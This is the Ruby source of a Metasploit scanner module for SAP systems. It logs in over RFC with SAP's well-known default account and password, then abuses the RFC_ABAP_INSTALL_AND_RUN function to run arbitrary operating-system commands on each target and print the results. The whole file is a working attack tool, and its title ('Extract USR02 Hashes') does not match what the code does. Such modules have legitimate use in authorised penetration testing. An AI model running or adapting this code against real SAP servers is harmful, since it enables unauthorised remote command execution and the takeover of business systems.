##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

##
# This module is based on, inspired by, or is a port of a plugin available in the Onapsis Bizploit Opensource ERP Penetration Testing framework - http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts in producing the Metasploit modules and was happy to share his knowledge and experience - a very cool guy.
# Id also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis who have Beta tested the modules and provided excellent feedback. Some people just seem to enjoy hacking SAP :)
##

require 'msf/core'
require 'msf/core/exploit/sap'

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::SAP::RFC
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'SAP RFC Extract USR02 Hashes',
      'Description'    => %q{
        This module makes use of the RFC_ABAP_INSTALL_AND_RUN Remote Function Call to execute arbitrary SYSTEM commands.
        RFC_ABAP_INSTALL_AND_RUN takes ABAP source lines and executes them. It is common for the the function to be disabled or access revoked in a production system. It is also deprecated.
        The module requires the NW RFC SDK from SAP as well as the Ruby wrapper nwrfc (http://rubygems.org/gems/nwrfc).
      },
      'References'     => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
      'Author'         => [ 'nmonkee' ],
      'License'        => BSD_LICENSE
    )

    register_options(
      [
        OptString.new('USERNAME', [true, 'Username', 'SAP*']),
        OptString.new('PASSWORD', [true, 'Password', '06071992']),
        OptString.new('CMD', [true, 'Command to Execute', 'id']),
      ], self.class)
  end

  def run_host(ip)
    user = datastore['USERNAME']
    pass = datastore['PASSWORD']
    unless datastore['CLIENT'] =~ /^\d{3}\z/
        fail_with(Exploit::Failure::BadConfig, "CLIENT in wrong format")
    end
    command = datastore['CMD']
    exec_SYSTEM(user, client, pass, rhost, rport, command)
  end

  def exec_SYSTEM(user, client, pass, rhost, rport, command)
    login(rhost, rport, client, user, pass) do |conn|
      conn.connection_info

      function = conn.get_function("RFC_ABAP_INSTALL_AND_RUN")
      fc = function.get_function_call

      code = "REPORT EXTRACT LINE-SIZE 255 NO STANDARD PAGE HEADING." + "\r\n"
      code << "TYPES lt_line(255) TYPE c." + "\r\n"
      code << "DATA lv_cmd(42) TYPE c." + "\r\n"
      code << "DATA lt_result TYPE STANDARD TABLE OF lt_line WITH HEADER LINE." + "\r\n"
      code << "lv_cmd = '#{command}'." + "\r\n"
      code << "CALL 'SYSTEM' ID 'COMMAND' FIELD lv_cmd" + "\r\n"
      code << "ID 'TAB' FIELD lt_result-*sys*." + "\r\n"
      code << "LOOP AT lt_result." + "\r\n"
      code << "WRITE : / lt_result." + "\r\n"
      code << "ENDLOOP." + "\r\n"

      code.each_line do |line|
        fc[:PROGRAM].new_row {|row| row[:LINE] = line.strip}
      end

      begin
        fc.invoke
        data = ''
        fc[:WRITES].each do |row|
          data << row[:ZEILE] << "\n"
        end

        print_good("#{rhost}:#{rport} [SAP] Executed #{command}")
        print(data)
      rescue NWError => e
        print_error("#{rhost}:#{rport} [SAP] #{e.code} - #{e.message}")
      end
    end
  end
end

